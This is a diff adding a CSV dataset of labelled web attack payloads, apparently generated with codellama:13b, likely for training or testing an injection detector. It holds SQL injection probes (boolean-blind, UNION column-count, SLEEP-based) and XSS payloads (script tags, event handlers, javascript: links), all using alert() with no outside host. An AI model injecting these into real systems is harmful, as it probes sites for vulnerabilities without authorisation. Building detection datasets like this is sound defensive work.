@@ -1,0 +1,41 @@
+payload,attack_type,attack_family,seed,label,generator,model_tag,payload_sha256
+1' AND '1'='1,sqli,boolean_blind,42,1,codellama,codellama:13b,9d70a183d43279b109737f6d125fbb778ed23f75dd235f58f856e8a12e7608c4
+1' AND '1'='2,sqli,boolean_blind,42,1,codellama,codellama:13b,5667f06ac0bf10dee635ce364dd1d2f48739d1c2f502e3e75b94faf520aa5992
+1' AND '1'='3,sqli,boolean_blind,42,1,codellama,codellama:13b,e72adca21543de269f8f7b6047688800843c7be6852c31f80c6f7ff6b1d0dde9
+1' AND '1'='4,sqli,boolean_blind,42,1,codellama,codellama:13b,f7d5ed4104a748d2adc8ec413c1c6d1b1284aeae6fa0fa3556466da918b9e435
+1' AND '1'='5,sqli,boolean_blind,42,1,codellama,codellama:13b,01e6b46bc5762dda429e0f0926caa2c1a7481e4094f883731eb0d3d9c972e9d0
+1' AND '1'='6,sqli,boolean_blind,42,1,codellama,codellama:13b,34ba7f341243ee86f2c0246bd6e3178d8ab17c7c00af1cd994319aa78c3b4cef
+1' AND '1'='7,sqli,boolean_blind,42,1,codellama,codellama:13b,3bc22575f5b8b33ea2ab2783ffde1d75a4520109e95418556a3ee44bbea09c1d
+1' AND '1'='8,sqli,boolean_blind,42,1,codellama,codellama:13b,98151df974d0b21b2c1ebad2041bd0af52c48784d730725259eecc9d62fd1e57
+1' AND '1'='9,sqli,boolean_blind,42,1,codellama,codellama:13b,c7d240c956fa87d76408a0cff61d360acd027747d0cd759536340e0b9f990937
+1' AND '1'='10,sqli,boolean_blind,42,1,codellama,codellama:13b,447e4335cb86719db31001d3fd34ba2fd4f5320d1cafad80fee60ee3581a922d
+"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",sqli,union_based,43,1,codellama,codellama:13b,36fe46b299556e322e3bebc623f7e89e81c4855d7a53b066b1c8fd38d184c66e
+"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--",sqli,union_based,43,1,codellama,codellama:13b,2569e2636813ecf89c232d47cba38e22025270e2410afd8b9b88d133bda04964
+"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",sqli,union_based,43,1,codellama,codellama:13b,42b645497f040fcd99317302e377cb34b2dc688e1bdff1eeabd2146d3a767c10
+"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--",sqli,union_based,43,1,codellama,codellama:13b,40f3dab88201789b3126c1984f21c302a248aa0299ab2cb3a0c66c0e49dced93
+"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--",sqli,union_based,43,1,codellama,codellama:13b,a5ef7d115ee35b0d25b872f4cefe477f1e5d4cd323bb9664a04c6fb7e5b7898d
+"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--",sqli,union_based,43,1,codellama,codellama:13b,2386f37d4ab2746e397056c556f49ec9a4a829e0c2f8be2e048977ea091474ac
+"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",sqli,union_based,43,1,codellama,codellama:13b,6d507ac3b1e579de4876451dcb766c1218a81fb27a49fc58b8e29a34a3244ae7
+"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",sqli,union_based,43,1,codellama,codellama:13b,9090cce74ffde6cff29327bb8033b7bafc4bb64d23bf3224f486e77d9ddb81e6
+"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",sqli,union_based,43,1,codellama,codellama:13b,9126e1d56935d4dfb279d1d36075ebaa1d773a287d346280a7764568a9f1ddda
+1' OR SLEEP(10)='1',sqli,time_based_blind,44,1,codellama,codellama:13b,7cac2f77a70310540b5b5a6e6d8e18e94f77d9f8b3e82c6ec7c86d05db9351b0
+<script>alert(1)</script>,xss,reflected,42,1,codellama,codellama:13b,5c140d35dcb46a622e2cedf5ef5cc3638cdffd1c118c9331f8c84669f0b74783
+<script>alert(2)</script>,xss,reflected,42,1,codellama,codellama:13b,141ce7a938b5973dd71c90bcdd7e4097317ee7374259cf6d8774fdfd86c1f8ea
+<script>alert(3)</script>,xss,reflected,42,1,codellama,codellama:13b,21a39046c56ea189a066b2a783951e16684488e32b239b2a62a0d5cd63fd6b43
+<script>alert(4)</script>,xss,reflected,42,1,codellama,codellama:13b,19ca54d7e700913dafb619698732ebf1efee7bdb8b319012d10facd4accafac0
+<script>alert(5)</script>,xss,reflected,42,1,codellama,codellama:13b,68514ce5ef5f81cbf9b5954c0f35b471c5b9e184ed23942f8b3b9db12838e123
+<script>alert(6)</script>,xss,reflected,42,1,codellama,codellama:13b,b8ac5cb5ec978ffb6e7784a99fb82ef84a7e02827db21bb1552b348351d59c5b
+<script>alert(7)</script>,xss,reflected,42,1,codellama,codellama:13b,44becf147552e0c66f649562b19f799b4a6acb5a59ccb894f76a60b39e9cdb96
+<script>alert(8)</script>,xss,reflected,42,1,codellama,codellama:13b,86abb8b2845d1bd7ab42d30c877b9fce9f741255adeb89f5f176789b8fc11798
+<script>alert(9)</script>,xss,reflected,42,1,codellama,codellama:13b,348efcc7a52013b4a5ff3b402cbe391079cc729acfb9fdc4e57d941aec8d9149
+<script>alert(10)</script>,xss,reflected,42,1,codellama,codellama:13b,35d879544ad0dc7ac6d6d9c597d06bd03e38bc38f91307bd805e432722ff5a47
+<img src=x onerror=alert(1)>,xss,dom_based,44,1,codellama,codellama:13b,63b586b4a93f204837ee1e038f8ce2be880e42e59bb43cc12813cf3ac6d05d0c
+<svg onload=alert(1)>,xss,dom_based,44,1,codellama,codellama:13b,5fd6b6cd55055a7731bf3f50b50f071521c6b68d97111044a75d19fe21cb251b
+<a href=javascript:alert(1)>click me</a>,xss,dom_based,44,1,codellama,codellama:13b,329580ffd50d3a9cb983416bf8b8338d4430bb8f7e25f2b18dcf2dbc681d9b1b
+<a href=# onclick=alert(1)>click me</a>,xss,dom_based,44,1,codellama,codellama:13b,42ad6e8b5c52203ca5010cdb031a3d3fe491937f8f9d6d6a07ad39bb32dceecc
+<a href=# onmouseover=alert(1)>click me</a>,xss,dom_based,44,1,codellama,codellama:13b,10c5421bde7a4dac4174e4674b4fb74ae5fd405a13c7002d0a5df841b2cd14b3
+<a href=# onfocus=alert(1)>click me</a>,xss,dom_based,44,1,codellama,codellama:13b,9bd3a4a7a0243b958f2cc5b1dd6ce90c32127003147cdbf7e3bc99938d81856a
+<a href=# onmousedown=alert(1)>click me</a>,xss,dom_based,44,1,codellama,codellama:13b,2718a2c65c5a4febf8257f1846e87c30653bcd861053091bc155b8da7cdd5cf3
+<a href=# onmouseup=alert(1)>click me</a>,xss,dom_based,44,1,codellama,codellama:13b,010171284220219b483e22d2a96feabef996cf3dff67acc05510390ac49d78fd
+<a href=# onmouseout=alert(1)>click me</a>,xss,dom_based,44,1,codellama,codellama:13b,3fd0bd6e0ff1a4caa8e5e818c2738182eb95cb354e77b797f60260c0c24e2859
+1' ONCLICK='alert(1)',xss,attribute_based,45,1,codellama,codellama:13b,68d23f2172d5152be4320ee3cc634976e9ccc082b55411a52b5bd73ccbb90666
